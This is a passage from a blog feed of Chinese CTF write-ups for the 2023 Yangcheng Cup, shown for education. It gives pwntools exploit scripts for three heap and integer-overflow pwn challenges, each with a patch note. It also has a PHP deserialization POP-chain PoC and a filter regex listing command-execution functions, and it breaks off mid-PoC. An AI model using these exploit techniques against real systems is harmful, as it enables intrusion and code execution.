class="hljs-string">&#x27;isadmin&#x27;</span>]<br></code></pre></td></tr></table></figure><p><code>&#123;&quot;verify_signature&quot;: False&#125;</code> 修改成 <code>&#123;&quot;verify_signature&quot;: True&#125;</code></p><hr><p><a href="https://blog.csdn.net/Jayjay___/article/details/132915944">参考文章1</a><br><a href="https://blog.csdn.net/solitudi/article/details/109231974">参考文章2</a></p><h1 id="pwn-arrary-index-bank"><a href="#pwn-arrary-index-bank" class="headerlink" title="pwn-arrary_index_bank"></a>pwn-arrary_index_bank</h1><h2 id="Break-5"><a href="#Break-5" class="headerlink" title="Break"></a>Break</h2><p>整数溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;account?&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.readuntil(<span class="hljs-string">&#x27;=&#x27;</span>)<br>    d=<span class="hljs-built_in">int</span>(p.readline())<br>    <span class="hljs-keyword">return</span> d<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;account?&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;much?&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>p=process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>d=show(-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>win=d-<span class="hljs-number">0x1426</span>+<span class="hljs-number">0x1315</span><br>e.address=d-<span class="hljs-number">0x1426</span><br><br>d=show(-<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>stack=d-<span class="hljs-number">0x30</span><br><br>you=e.address+<span class="hljs-number">0x4010</span><br>ind=(you-stack)//<span class="hljs-number">8</span><br><span class="hljs-comment">#print(show(ind))</span><br>edit(ind,<span class="hljs-number">0x20</span>)<br><span class="hljs-built_in">print</span>(edit(<span class="hljs-number">7</span>,win))<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Fix-5"><a href="#Fix-5" class="headerlink" title="Fix"></a>Fix</h2><p>修改<code>jle</code>指令变成<code>jbe</code></p><blockquote><p>JBE用于无符号数比较，JLE用于有符号数比较</p></blockquote><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-arrary_index_bank-1.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-arrary_index_bank-2.png"></p><h1 id="pwn-easy-force"><a href="#pwn-easy-force" class="headerlink" title="pwn-easy_force"></a>pwn-easy_force</h1><h2 id="Break-6"><a href="#Break-6" class="headerlink" title="Break"></a>Break</h2><p>house_of_force</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">&#x27;\n&#x27;</span>,end=<span class="hljs-literal">False</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;away&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index?&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;want?&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;write?&#x27;</span>,data)<br>    <span class="hljs-keyword">if</span> end==<span class="hljs-literal">False</span>:<br>        p.readuntil(<span class="hljs-string">&#x27;balckbroad on &#x27;</span>)<br>        d=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27; &#x27;</span>),<span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">return</span> d<br><br>gadget=<span class="hljs-number">0x6a2226</span><br>puts=<span class="hljs-number">0x6f6a0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">p</span>):<br>    <span class="hljs-comment">#gadget=int(input(&quot;asdfasdf:&quot;),16)</span><br>    chunk1=add(<span class="hljs-number">0x0</span>,<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">8</span>)<br>    top_chunk=chunk1+<span class="hljs-number">0x20</span><br>    to=<span class="hljs-number">0x602000</span><br>    chunk2=add(<span class="hljs-number">1</span>,(to-top_chunk))<br>    chunk3=add(<span class="hljs-number">2</span>,<span class="hljs-number">0x58</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+gadget.to_bytes(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;little&#x27;</span>),<span class="hljs-literal">True</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(chunk2))<br>    p.sendline(<span class="hljs-string">&quot;asdfasdf&quot;</span>)<br>    d=p.readuntil(<span class="hljs-string">&#x27;asdfasdf&#x27;</span>,timeout=<span class="hljs-number">0.01</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;asdf&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> d:<br>        <span class="hljs-keyword">return</span><br>    p.interactive()<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>     <span class="hljs-comment">#   gdb.attach(p)</span><br>        pwn(p)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-keyword">pass</span><br>    p.close()<br><br><br>    time.sleep(<span class="hljs-number">0.01</span>)<br></code></pre></td></tr></table></figure><h2 id="Fix-6"><a href="#Fix-6" class="headerlink" title="Fix"></a>Fix</h2><p>修改写入数据长度  <code>0x30--&gt;0x10</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-easy_force.png"></p><h1 id="pwn-Printf-but-not-fmtstr"><a href="#pwn-Printf-but-not-fmtstr" class="headerlink" title="pwn-Printf but not fmtstr"></a>pwn-Printf but not fmtstr</h1><h2 id="Break-7"><a href="#Break-7" class="headerlink" title="Break"></a>Break</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br>libc=ELF(<span class="hljs-string">&quot;./pwn2lib&quot;</span>)<br>p=process(<span class="hljs-string">&#x27;./pwn2&#x27;</span>)<br>gdb.attach(p)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x508</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x518</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x518</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x518</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x518</span>)<br><br><span class="hljs-comment"># one</span><br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>p.readuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>lbin=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address=lbin-<span class="hljs-number">0x40</span>-<span class="hljs-number">62</span>*<span class="hljs-number">0x10</span>-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span>-<span class="hljs-number">0x1f6830</span>-<span class="hljs-number">0x430</span><br>success(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;libc.address=:x&#125;</span>&quot;</span>)<br><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x600</span>)<br>edit(<span class="hljs-number">2</span>,p64(lbin)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0x404140</span>)*<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x600</span>)<br><br>show(<span class="hljs-number">2</span>)<br>p.readuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>chunk0=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;chunk0=:x&#125;</span>&quot;</span>)<br><br>fc=<span class="hljs-number">0x4040e0</span><br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x508</span>)<br><br>payload=flat(&#123;<span class="hljs-number">0</span>:[<span class="hljs-number">0</span>,<span class="hljs-number">0x501</span>,fc-<span class="hljs-number">0x18</span>,fc-<span class="hljs-number">0x10</span>],<span class="hljs-number">0x500</span>:[<span class="hljs-number">0x500</span>,<span class="hljs-number">0x520</span>]&#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>edit(<span class="hljs-number">0</span>,payload)<br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0x4040e0</span>)*<span class="hljs-number">16</span>)<br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0x404000</span>))<br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0x4011d6</span>))<br>free(<span class="hljs-number">1</span>)<br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Fix-7"><a href="#Fix-7" class="headerlink" title="Fix"></a>Fix</h2><p>修改plt表中的free函数项，使其在执行时跳转到自己构造的指令位置，用于执行free函数并将指针数组中被释放的chunk的地址设置为NULL</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-Printf%20but%20not%20fmtstr.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Break和Fix阶段都是小组第一&lt;/p&gt;
&lt;p&gt;比赛的时候没写wp，&lt;strong&gt;赛后复现&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;web-ezSSTI&quot;&gt;&lt;a href=&quot;#web-ezSSTI&quot; class=&quot;headerlink&quot; title=&quot;web-ezSS</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="awdp" scheme="https://www.lewiserii.top/tags/awdp/"/>
    
    <category term="羊城杯" scheme="https://www.lewiserii.top/tags/%E7%BE%8A%E5%9F%8E%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>2023羊城杯初赛misc&amp;web wp</title>
    <link href="https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2023%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bwp.html"/>
    <id>https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2023%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bwp.html</id>
    <published>2023-09-03T05:00:00.000Z</published>
    <updated>2023-10-14T07:41:00.040Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="D0n’t-pl4y-g4m3"><a href="#D0n’t-pl4y-g4m3" class="headerlink" title="D0n’t pl4y g4m3!!!"></a>D0n’t pl4y g4m3!!!</h2><p>访问<code>/p0p.php</code>，返回一个<code>hint.zip</code></p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">Ö<span class="hljs-type">_</span><span class="hljs-number">0</span> <span class="hljs-number">0</span><span class="hljs-variable">vO</span> <span class="hljs-variable">Ow0</span> <span class="hljs-number">0</span><span class="hljs-variable">w0</span> Ö<span class="hljs-type">_</span><span class="hljs-number">0</span> Ö<span class="hljs-type">_O</span> Ö<span class="hljs-operator">.</span><span class="hljs-built_in">O</span> <span class="hljs-type">o_o</span> <span class="hljs-number">0.</span><span class="hljs-built_in">O</span> <span class="hljs-variable">OvO</span> <span class="hljs-variable">o</span><span class="hljs-number">.0</span> <span class="hljs-variable">owo</span> <span class="hljs-variable">o</span><span class="hljs-operator">.</span>Ö Ö<span class="hljs-operator">.</span>Ö <span class="hljs-variable">Ovo</span> <span class="hljs-number">0</span><span class="hljs-type">_</span>Ö Ö<span class="hljs-type">_o</span> <span class="hljs-variable">owO</span> <span class="hljs-built_in">O</span><span class="hljs-number">.0</span> <span class="hljs-variable">owo</span> Ö<span class="hljs-type">_o</span> <span class="hljs-variable">owO</span> <span class="hljs-built_in">O</span><span class="hljs-number">.0</span> <span class="hljs-variable">owo</span> Ö<span class="hljs-type">_</span><span class="hljs-number">0</span> <span class="hljs-number">0</span><span class="hljs-variable">w</span>Ö <span class="hljs-built_in">O</span><span class="hljs-number">.0</span> <span class="hljs-number">0</span><span class="hljs-variable">w0</span> Ö<span class="hljs-type">_</span><span class="hljs-number">0</span> <span class="hljs-variable">OwO</span> <span class="hljs-variable">ov0</span> <span class="hljs-variable">owo</span> <span class="hljs-type">o_O</span> <span class="hljs-built_in">O</span><span class="hljs-operator">.</span>Ö Ö<span class="hljs-variable">vo</span><br></code></pre></td></tr></table></figure><p><a href="https://zdjd.vercel.app/">尊嘟假嘟翻译器O.o</a>得到<code>flag在/tmp/catcatf1ag.txt</code></p><p>利用  <a href="http://www.gem-love.com/2023/02/04/PHP-7-4-21-Development-Server%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/">PHP&lt;&#x3D;7.4.21 Development Server源码泄露漏洞</a>  得到源码</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-web-1.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;HTTP/1.1 302 found&quot;</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:https://passer-by.com/pacman/&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pro</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$exp</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$rce2</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$rce2</span>=<span class="hljs-variable language_">$this</span>-&gt;exp[<span class="hljs-variable">$rce2</span>];<br>    &#125;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&quot;cat /flag&quot;</span>);<br>     &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yang</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$ary</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key === <span class="hljs-literal">true</span> || <span class="hljs-variable language_">$this</span>-&gt;finish1-&gt;name) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;finish-&gt;finish) &#123;<br>                <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;now[<span class="hljs-variable">$name</span>], <span class="hljs-variable">$ary</span>[<span class="hljs-number">0</span>]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ycb</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;now = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;finish-&gt;finish;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = True;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cheng</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$finish</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;name[<span class="hljs-variable">$value</span>];<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bei</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;CTF-&gt;<span class="hljs-title function_ invoke__">ycb</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;fine-&gt;<span class="hljs-title function_ invoke__">YCB1</span>(<span class="hljs-variable">$this</span>-&gt;rce, <span class="hljs-variable">$this</span>-&gt;rce1);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">prohib</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$a</span>);<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;CTF&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;<br>  <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">prohib</span>(<span class="hljs-variable">$a</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>一个php反序列化，从hint中得知flag位置不在根目录，所以<code>Pro</code>类可以舍弃<br>发现敏感函数<code>call_user_func</code>，所以最终应该要调用<code>__call</code>，而在<code>Bei</code>中<code>__destruct()</code>存在函数调用，poc如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Bei</span>();<br><br><span class="hljs-variable">$a</span> -&gt; CTF = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yang</span>();<br><span class="hljs-variable">$a</span> -&gt; CTF -&gt; finish = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cheng</span>();<br><span class="hljs-variable">$a</span> -&gt; CTF -&gt; finish -&gt; name = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;finish&quot;</span>=&gt;<span class="hljs-literal">true</span>);<br><br><br><span class="hljs-variable">$a</span> -&gt; fine = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yang</span>();<br><span class="hljs-variable">$a</span> -&gt; rce = <span class="hljs-string">&quot;/tmp/catcatf1ag.txt&quot;</span>;<br><span class="hljs-variable">$a</span> -&gt; fine -&gt; finish = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cheng</span>();<br><span class="hljs-variable">$a</span> -&gt; fine -&gt; finish -&gt; name = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;finish&quot;</span>=&gt;<span class="hljs-literal">true</span>);<br><span class="hljs-variable">$a</span> -&gt; fine -&gt; now = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;YCB1&quot;</span>=&gt;<span class="hljs-string">&quot;highlight_file&quot;</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span 